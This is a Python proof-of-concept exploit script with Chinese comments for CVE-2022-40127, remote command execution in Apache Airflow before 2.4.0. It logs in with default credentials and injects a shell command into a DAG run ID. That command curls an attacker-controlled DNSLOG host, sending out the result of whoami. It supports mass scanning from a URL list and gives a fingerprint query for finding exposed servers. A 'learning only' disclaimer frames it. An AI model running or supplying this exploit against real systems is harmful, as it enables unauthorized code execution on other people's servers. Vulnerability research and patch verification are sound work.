# coding=utf-8
# 学习python，自己写的一些历史漏洞的poc，仅供学习参考，请勿用于非法用途，产生的法律风险由您自己负责。
# 参考链接：https://github.com/Mr-xn/CVE-2022-40127
# 漏洞描述
# Apache Airflow < 2.4.0 DAG example_bash_operator RCE
# 漏洞影响
# Apache Airflow < 2.4.0
# 网络空间测绘hunter
# app.name="Apache Airflow"
# poc使用方法 python CVE-2022-40127.py -u url -du DNSLOG地址 [-u 用户名 -p 密码 -c cookie]或 python poc.py -uf url.txt -du DNSLOG地址 [-u 用户名 -p 密码 -c cookie]
import argparse
import json
import sys
from datetime import datetime
import random
import requests
from lxml import etree
from concurrent.futures import ThreadPoolExecutor

head = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
}


def get_token(session, url):
    try:
        resp = session.get(url, timeout=5)
        tree = etree.HTML(resp.text)
        token = ''.join(tree.xpath('//*[@id="csrf_token"]/@value'))
        return token
    except requests.exceptions.ConnectionError:
        print(f'{url}连接超时！')
        pass


# 获取token
def get_cookie(session, url, token, username, password):
    data = {
        "username": username,
        "password": password,
        "csrf_token": token
    }
    try:
        res = session.post(f'{url}/login/?next=http%3A%2F%2F34.81.245.161%3A8080%2Fhome', headers=head,
                           data=data, timeout=5)
        if "Invalid login" in res.text:
            return 0
    except requests.exceptions.ConnectionError:
        print(f'{url}连接超时！')
        pass


# 拼接token，登录获取session
def poc_send(session, url, dnsurl):
    head1 = {
        "Accept": "application/json",
        "Content-Type": "application/json"
    }

    data1 = {
        "conf": {"dag_run": "api2"},
        "dag_run_id": f"id \"&& curl `whoami`.{dnsurl}",
        "logical_date": datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
    }
    try:
        # 打poc
        re = session.post(f'{url}/api/v1/dags/example_bash_operator/dagRuns', headers=head1,
                          data=json.dumps(data1), timeout=5)

        if re.status_code == 200:
            print(f"\033[1;31m{url}存在漏洞!\033[0m")
        else:
            num = random.randint(1,999)
            data2 = {
                "conf": {"dag_run": "api2"},
                "dag_run_id": f"id \"&& curl {num}.{dnsurl}",
                "logical_date": datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
            }
            re = session.post(f'{url}/api/v1/dags/example_bash_operator/dagRuns', headers=head1,
                              data=json.dumps(data2), timeout=5)
            if re.status_code == 200:
                print(f"\033[1;31m{url}存在漏洞!\033[0m")
            else:
                print(f"{url}不存在漏洞！")
    except requests.exceptions.ConnectionError:
        print(f'{url}连接超时！')
        pass


def user_pass_poc(url, username, password, dnsurl):
    session = requests.session()
    token = get_token(session, url)
    status = get_cookie(session, url, token, username, password)
    if status != 0:
        poc_send(session, url, dnsurl)
    else:
        print(f'{url}登录失败，账号密码错误！')


def cookie_poc(cookie, url, dnsurl):
    poc_send(cookie, url, dnsurl)


def cmdline(known=False):
    parser = argparse.ArgumentParser()
    parser.add_argument(
        '-u',
        '--url',
        help='-u http://test.com',
        type=str
    )
    parser.add_argument(
        '-uf',
        '--urlfile',
        help='-uf 1.txt',
        type=str
    )
    parser.add_argument(
        '-du',
        '--dnsurl',
        help='-du DNSLOG',
        type=str
    )
    parser.add_argument(
        '-c',
        '--cookie',
        help='-c COOKIE',
        type=str,
        default=""
    )
    parser.add_argument(
        '-user',
        '--username',
        help='-user airflow',
        type=str,
        default="airflow"
    )
    parser.add_argument(
        '-pass',
        '--password',
        help='-pass airflow',
        type=str,
        default="airflow"
    )
    parser.add_argument(
        '-t',
        '--thread',
        help='-t 20',
        type=int,
        default=20
    )
    opt = parser.parse_args()
    return opt


def main():
    opt = cmdline()
    if opt.urlfile:
        if opt.dnsurl is None:
            print("请输入dnslog地址！")
            sys.exit()
        urls = open(opt.urlfile).readlines()
        with ThreadPoolExecutor(opt.thread) as t:
            for url in urls:
                t.submit(user_pass_poc(url.replace("\n", ""), opt.username, opt.password, opt.dnsurl))
    elif opt.url:
        if opt.dnsurl is None:
            print("请输入dnslog地址！")
            sys.exit()
        if opt.cookie:
            cookie_poc(opt.cookie, opt.url, opt.dnsurl)
        else:
            user_pass_poc(opt.url, opt.username, opt.password, opt.dnsurl)
    else:
        print('参数错误！')


if __name__ == '__main__':
    main()
# 学习python，自己写的一些历史漏洞的poc，仅供学习参考，请勿用于非法用途，产生的法律风险由您自己负责。
